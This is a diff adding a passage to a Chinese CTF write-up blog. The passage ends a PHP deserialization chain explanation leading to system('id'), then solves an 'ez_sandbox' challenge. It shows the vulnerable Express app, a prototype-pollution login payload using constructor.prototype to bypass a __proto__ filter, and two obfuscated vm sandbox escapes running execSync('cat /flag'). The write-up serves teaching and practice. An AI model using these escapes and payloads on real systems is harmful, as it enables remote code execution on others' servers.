+<p>首先往DataObject的data里传入两个实例，其中传入的cache2指定了helper，key值设置为要执行的命令，helper的clean()（实际上是<code>__call</code>的funcs数组）放入了system命令执行函数，然后让Storge的store属性成为cache2 expired 属性的引用</p>
+<p>这样, 在反序列化时, 首先会调用两个 Cache 的 __wakeup 方法, 将各自的 expired 设置为 False<br>然后调用 dataObject 的 __destruct 方法, 从而调用 Storage 的 __set 方法<br>Storage 首先将 store (即 cache1 的 expired 属性) 初始化为一个空数组, 然后存入 cache1<br>此时, store 不为空, 那么也就是说 cache1 的 expired 属性不为空<br>然后来到 cache2, storage 的 __set 方法调用它的 expired 方法, 进入 if 判断<br>因为此时 cache2 的 expired 字段, 也就是上面的 store, 已经被设置成了一个数组, 并且数组中存在 cache1 (不为空), 因此这里 if 表达式的结果为 True<br>最后进入 helper 的 clean 方法, 执行 system(‘id’); 实现 RCE</p>
+<h2 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h2><p>考点：JavaScript 原型链污染绕过、vm 沙箱逃逸</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#app<span class="token punctuation">.</span>js
+
+
+
+<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">secret</span><span class="token operator">:</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token keyword">var</span> admins <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'__proto__'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">continue</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> target
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">clone</span><span class="token punctuation">(</span><span class="token parameter">source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token string">'mainModule'</span><span class="token punctuation">,</span> <span class="token string">'require'</span><span class="token punctuation">,</span> <span class="token string">'child_process'</span><span class="token punctuation">,</span> <span class="token string">'process'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'execSync'</span><span class="token punctuation">,</span> <span class="token string">'execFile'</span><span class="token punctuation">,</span> <span class="token string">'execFileSync'</span><span class="token punctuation">,</span> <span class="token string">'spawn'</span><span class="token punctuation">,</span> <span class="token string">'spawnSync'</span><span class="token punctuation">,</span> <span class="token string">'fork'</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> v <span class="token keyword">of</span> blacklist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>code<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>v <span class="token operator">+</span> <span class="token string">' is banned'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">requireLogin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/index.html'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/login.html'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/register.html'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> users <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> username
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> admins<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">=</span> <span class="token string">'admin'</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">=</span> <span class="token string">'guest'</span>
+        <span class="token punctuation">&#125;</span>
+
+        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'login success'</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'login failed'</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> users<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'register failed'</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> password
+        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'register success'</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/profile'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+        <span class="token string-property property">'user'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
+        <span class="token string-property property">'role'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/sandbox'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> code <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>code
+        <span class="token keyword">let</span> sandbox <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
+        <span class="token keyword">let</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span>
+        
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">waf</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
+            <span class="token keyword">let</span> result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> context<span class="token punctuation">)</span>
+            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                <span class="token string-property property">'result'</span><span class="token operator">:</span> result
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                <span class="token string-property property">'result'</span><span class="token operator">:</span> e<span class="token punctuation">.</span>message
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            <span class="token string-property property">'result'</span><span class="token operator">:</span> <span class="token string">'Your role is not admin, so you can not run any code'</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server start listening on :3000'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在这里每一次请求都会删除prototype值</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'__proto__'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">continue</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> target
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其实看到这就会想到是原型链污染，<code>__proto__</code>被过滤了，但是可以使用<code>constructor.prototype</code>来绕过过滤<br>先注册一个<code>test</code>用户, 在登录时 POST 如下内容, 污染<code>admins</code>对象, 使得<code>username in admins</code>表达式的结果为 <code>True</code></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
+    <span class="token string-property property">"username"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"password"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"constructor"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token string-property property">"prototype"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"test"</span><span class="token operator">:</span> <span class="token string">"123"</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/ba5c72a83e3441ba81966da664e63f15.png" alt="456"></p>
+<p><img src="https://img-blog.csdnimg.cn/319fb067e4264030bd677e8afbdb914e.png" alt="1"></p>
+<p>然后就是vm沙箱逃逸<br>参考链接<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859#toc-4">沙箱逃逸初识</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方法一：</span>
+<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">const</span> cc <span class="token operator">=</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller<span class="token punctuation">;</span>
+            <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>cc<span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return pro'</span><span class="token operator">+</span><span class="token string">'cess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requ'</span><span class="token operator">+</span><span class="token string">'ire'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+<span class="token comment">//方法二：</span>
+<span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> 
+obj<span class="token punctuation">.</span><span class="token function">__defineGetter__</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> c <span class="token operator">=</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller
+    <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return pro'</span><span class="token operator">+</span><span class="token string">'cess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requi'</span><span class="token operator">+</span><span class="token string">'re'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">throw</span> obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
  
       <!-- reward -->
       
@@ -404,7 +846,7 @@
 <nav class="navbar">
   
   <div class="logo">
-    <a href="/"><img src="/images/ayer-side.png" alt="n0rt6&#39;s bolg"></a>
+    <a href="/"><img src="/images/ayer-side.png" alt="n0rt6&#39;s blog"></a>
   </div>
   
   <ul class="nav nav-main">
